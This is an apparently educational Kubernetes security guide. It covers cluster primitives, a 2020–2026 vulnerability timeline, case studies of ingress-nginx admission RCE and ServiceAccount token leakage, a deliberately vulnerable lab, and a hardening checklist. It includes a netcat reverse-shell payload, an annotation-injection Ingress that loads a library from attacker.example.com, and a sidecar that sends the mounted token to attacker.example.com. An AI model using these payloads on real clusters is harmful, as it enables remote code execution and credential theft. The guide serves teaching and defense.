# Kubernetes Primitive Exploitation & Evolution (2024–2026)

## Introduction

As Kubernetes (K8s) adoption surged, its core primitives (Pods, Services, ServiceAccounts, RBAC objects, and controllers) became high-value attack surfaces.

This document serves two audiences:

- **The entryway (novices):** a city metaphor explaining how components interact and why each primitive matters.
- **The deep end (researchers):** a technical view of recent vulnerabilities and exploitation patterns, with lab-safe proof-of-concept (PoC) snippets and a reproducible mini-lab.

## 1. Fundamentals (the “city map”)

### 1.1 Control plane and node components

- **API server (city hall):** the front door to cluster state. Users and control-plane components interact with it via REST; it persists objects (Pods, Services, Secrets, etc.) into etcd.
- **etcd (power plant):** a consistent distributed key-value store holding cluster state. Compromise often implies full-state read access, including Secrets and configuration.
- **kubelet (maintenance crew):** runs on each node, reconciles Pods, and interacts with the runtime. The API server also talks to kubelets for log retrieval, port-forwarding, and attach/exec flows, so securing this channel matters.

### 1.2 Primitives as attack surfaces

| Primitive | What it is | Why attackers care |
|---|---|---|
| Pod | Smallest deployable unit: one or more containers with shared network and storage. | Runs application code; misconfigurations enable privileged containers, hostPath mounts, or token access. |
| Service | Stable virtual IP/port abstraction in front of a dynamic Pod set. | Enables internal pivoting; misconfigured exposure (NodePort/LoadBalancer/ExternalIPs) can broaden reach. |
| ServiceAccount | Namespace-scoped identity for Pods; tokens are often mounted automatically (unless disabled). | Token theft enables API calls as that identity; token scope and RBAC bindings determine blast radius. |
| Role / RoleBinding | Namespace RBAC objects binding verbs/resources to principals. | Overly-permissive bindings enable lateral movement and privilege escalation. |
| kube-proxy | Node-level service routing via iptables/IPVS rules (or replacement implementations in some CNIs). | Enables traffic shaping/routing; misconfigurations or race windows can weaken network restrictions. |

### 1.3 kube-proxy and lateral movement

`kube-proxy` watches Service and Endpoint objects and programs packet-forwarding rules to steer traffic to target Pods. Some network plugins replace it entirely.

From an attacker’s perspective, kube-proxy is the **road network** between “houses” (Pods). In certain failure or race scenarios (for example, policy deletion occurring before workload teardown), there can be short windows where expected restrictions do not apply, increasing the feasibility of lateral movement.

---

## 2. Timeline (2020–2026): trend shift toward identity abuse

Early Kubernetes exploitation emphasized container escapes and runtime bugs. As the ecosystem matured, exploitation shifted toward **identity-driven chains**: admission-controller manipulation, annotation injection, token theft, and RBAC abuse.

| Year | Selected CVEs / themes | Trend |
|---|---|---|
| 2020 | Service route poisoning and node setting bypasses. | Networking and boundary weaknesses. |
| 2021 | Ingress controller misconfig/injection issues and policy bypass patterns. | Beginning of identity + annotation abuse. |
| 2022 | SSRF and proxy behavior flaws in control plane and networking components. | SSRF + proxy exploitation. |
| 2023 | Admission and policy bypasses; annotation injection leading to command execution. | Focus on control-plane policy and admission paths. |
| 2024 | Mountable-secrets policy bypass; CSI token leakage via logs; ingress annotation validation bypass; network policy race windows; kubelet RCE via legacy volume types. | Identity abuse becomes mainstream; “glue” components become targets. |
| 2025 | Ingress admission-controller RCE chains (“IngressNightmare” family); runtime escapes remain relevant. | Control-plane RCE impacts are “cluster-wide” by design. |
| 2026 | OIDC / impersonation edge cases in supply-chain operators (for example GitOps controllers). | RBAC and identity bypass; CD/supply-chain focus. |

---

## 3. Deep dive: selected exploit patterns

### 3.1 Case study: IngressNightmare (Ingress NGINX admission-controller RCE)

**Root cause (high level):** The ingress-nginx controller’s admission controller built an NGINX configuration from an Ingress object and executed `nginx -t` to validate it. In vulnerable versions, attacker-controlled fields could influence the validation configuration in unsafe ways, enabling remote code execution in the admission controller context.

**Attacker prerequisites:** permission to create or modify Ingress objects in a namespace that is handled by the vulnerable controller.

**PoC (lab-only; do not run on production clusters):**

Build a shared object that runs a command on load:

```c
// evil.c (lab-only)
#include <stdlib.h>
__attribute__((constructor)) void init() {
  system("/bin/sh -c 'nc -e /bin/sh ATTACKER_IP 4444'");
}
```

Compile it:

```sh
gcc -fPIC -shared evil.c -o /tmp/libevil.so
```

Example Ingress payload structure (illustrative):

```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: exploit-ingress
  namespace: default
  annotations:
    nginx.ingress.kubernetes.io/auth-tls-secret: "default/dummy"
    nginx.ingress.kubernetes.io/auth-tls-pass-certificate-to-upstream: "true"
    nginx.ingress.kubernetes.io/auth-tls-match-cn: "; ssl_engine dynamic; ssl_engine dynamic;
      ssl_dhparam https://attacker.example.com/libevil.so; #"
spec:
  rules:
  - host: attacker.example.com
    http:
      paths:
      - path: /
        pathType: Prefix
        backend:
          service:
            name: dummy
            port:
              number: 80
```

**Mitigation:** upgrade ingress-nginx to patched versions, disable the admission controller if not needed, and restrict who can create/modify Ingress resources.

---

### 3.2 Case study: ServiceAccount token leakage via logging and sidecars

#### 3.2.1 Azure File CSI driver token leak (CVE-2024-3744)

**Root cause:** Under verbose logging, TokenRequest-based ServiceAccount tokens could be printed into CSI driver logs.

**PoC (lab-only):** mount a CSI volume with TokenRequest behavior enabled, then inspect node/log aggregation outputs for token strings.

Example Pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: csi-token-leak
  namespace: default
spec:
  serviceAccountName: app-sa
  containers:
  - name: busybox
    image: busybox
    command: ["/bin/sh", "-c", "sleep 3600"]
    volumeMounts:
    - mountPath: /mnt/azure
      name: azure
  volumes:
  - name: azure
    csi:
      driver: file.csi.azure.com
      readOnly: false
      volumeAttributes:
        shareName: testshare
      nodePublishSecretRef:
        name: azure-secret
      podInfoOnMount: true
```

Example API call using a leaked token:

```sh
export TOKEN="<leaked JWT>"
curl -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/namespaces/default/secrets
```

**Mitigation:** upgrade the driver to a fixed release, minimize production log verbosity, and monitor log pipelines for token-like patterns.

#### 3.2.2 Generic sidecar token exfiltration pattern

Even without a specific CVE, a common chain is:

- a malicious or compromised sidecar reads the mounted ServiceAccount token;
- the token is exfiltrated;
- attacker uses it for API calls within the granted RBAC scope.

Example Pod (lab-only):

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: sidecar-steal
  namespace: demo
spec:
  serviceAccountName: victim-sa
  automountServiceAccountToken: true
  containers:
  - name: app
    image: nginx
  - name: exfil
    image: alpine
    command:
    - /bin/sh
    - -c
    - |
      TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
      curl -X POST -d "token=$TOKEN" https://attacker.example.com/collect
    volumeMounts:
    - name: token
      mountPath: /var/run/secrets/kubernetes.io/serviceaccount
  volumes:
  - name: token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 3600
```

**Mitigation:** set `automountServiceAccountToken: false` on Pods that do not need API access, restrict RBAC to least privilege, and use admission policies to constrain injected sidecars.

---

## 4. Mini-lab (intentionally vulnerable YAML)

Use this lab only in isolated environments (kind/minikube). It creates a namespace with deliberately unsafe RBAC and policy settings.

### 4.1 Namespaces and RBAC (`00-namespace.yaml`)

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: demo
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: victim-sa
  namespace: demo
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: victim-admin
subjects:
- kind: ServiceAccount
  name: victim-sa
  namespace: demo
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
```

### 4.2 Permissive Pod Security Admission (`01-permissive-psa.yaml`)

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: demo
  labels:
    pod-security.kubernetes.io/enforce: privileged
    pod-security.kubernetes.io/audit: privileged
    pod-security.kubernetes.io/warn: privileged
```

### 4.3 Overly-permissive NetworkPolicy (`02-vulnerable-networkpolicy.yaml`)

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-all-by-mistake
  namespace: demo
spec:
  podSelector: {}
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: demo
    ports:
    - protocol: TCP
      port: 5432
```

### Deployment instructions

Start a local cluster:

```sh
# minikube
minikube start --kubernetes-version=v1.29.3

# or kind
kind create cluster --image kindest/node:v1.29.3
```

Apply the lab:

```sh
mkdir lab
cd lab
# create files 00-namespace.yaml, 01-permissive-psa.yaml, 02-vulnerable-networkpolicy.yaml
kubectl apply -f .
```

Clean up:

```sh
kubectl delete namespace demo
# or
kind delete cluster
```

---

## 5. Defense-in-depth checklist (CIS-aligned)

- Use least-privilege RBAC; regularly audit RoleBindings and ClusterRoleBindings.
- Keep log verbosity minimal and treat logs as sensitive; monitor for token leakage.
- Harden admission controllers; restrict dangerous annotations and keep ingress controllers patched.
- Enforce Pod Security Standards; avoid privileged containers and hostPath mounts unless required.
- Reduce ServiceAccount token exposure; disable automount where possible and scope tokens via TokenRequest.
- Apply default-deny NetworkPolicies and validate enforcement under real controller behavior.
- Secure kubelet communication paths; restrict access and enforce TLS validation.
- Protect etcd via isolation, TLS, authentication, and minimal access paths.
- Patch container runtimes promptly; track high-severity `runc` and containerd advisories.
- Exercise incident response plans for identity compromise and runtime escapes.

## References

1. Kubernetes Documentation: Components Overview — https://kubernetes.io/docs/concepts/overview/components/
2. Kubernetes Documentation: Control Plane / Node Communication — https://kubernetes.io/docs/concepts/architecture/control-plane-node-communication/
3. Kubernetes Documentation: Pods — https://kubernetes.io/docs/concepts/workloads/pods/
4. Kubernetes Documentation: Services — https://kubernetes.io/docs/concepts/services-networking/service/
5. Kubernetes Documentation: ServiceAccounts — https://kubernetes.io/docs/concepts/security/service-accounts/
6. Kubernetes Documentation: RBAC Authorization — https://kubernetes.io/docs/reference/access-authn-authz/rbac/
7. Kubernetes Documentation: Cluster Architecture — https://kubernetes.io/docs/concepts/architecture/
8. NVD: CVE-2024-7598 — https://nvd.nist.gov/vuln/detail/CVE-2024-7598
9. NVD: CVE-2023-2727 — https://nvd.nist.gov/vuln/detail/CVE-2023-2727
10. NVD: CVE-2023-2728 — https://nvd.nist.gov/vuln/detail/CVE-2023-2728
11. Kubernetes Issue: CVE-2024-3177 (ServiceAccount admission plugin / mountable secrets) — https://github.com/kubernetes/kubernetes/issues/124336
12. Kubernetes Issue: CVE-2024-3744 (azure-file CSI token logging) — https://github.com/kubernetes/kubernetes/issues/124759
13. NVD: CVE-2024-7646 — https://nvd.nist.gov/vuln/detail/CVE-2024-7646
14. NVD: CVE-2024-10220 — https://nvd.nist.gov/vuln/detail/CVE-2024-10220
15. ARMO Blog: Critical ingress-nginx vulnerabilities — https://www.armosec.io/blog/kubernetes-ingress-nginx-critical-vulnerabilities/
16. ARMO Blog: High-severity runc vulnerabilities overview — https://www.armosec.io/blog/high-severity-runc-vulnerabilities-what-you-need-to-know/
17. NVD: CVE-2026-23990 — https://nvd.nist.gov/vuln/detail/CVE-2026-23990
